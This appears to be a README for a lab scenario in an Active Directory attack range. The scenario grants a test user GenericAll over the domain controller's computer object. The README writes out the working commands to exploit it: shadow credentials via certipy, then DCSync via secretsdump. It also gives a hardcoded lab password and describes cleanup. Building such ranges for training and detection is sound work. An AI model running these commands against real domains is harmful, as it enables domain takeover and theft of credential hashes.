# acl-genericall-computer

Gives `scn-acl-gac-attacker` (password `Aa1234567890!`) `GenericAll` on the computer object of the domain controller of the target domain.

Attack (RBCD or shadow credentials on the DC, then DCSync):

    certipy shadow auto -u scn-acl-gac-attacker@<domain> -p 'Aa1234567890!' -account '<dc hostname>$'
    secretsdump.py -k -no-pass <domain>/'<dc hostname>$'@<dc fqdn>

How to verify:

    dacledit.py -action read -principal scn-acl-gac-attacker -target '<dc hostname>$' <domain>/scn-acl-gac-attacker:'Aa1234567890!' -dc-ip <dc ip>

Disable removes the ACE, clears `msDS-KeyCredentialLink` and `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC object (both empty in Base), deletes computer accounts the attacker created, and deletes the user. Not cleaned: secrets dumped during the attack (rotate krbtgt by hand if needed).
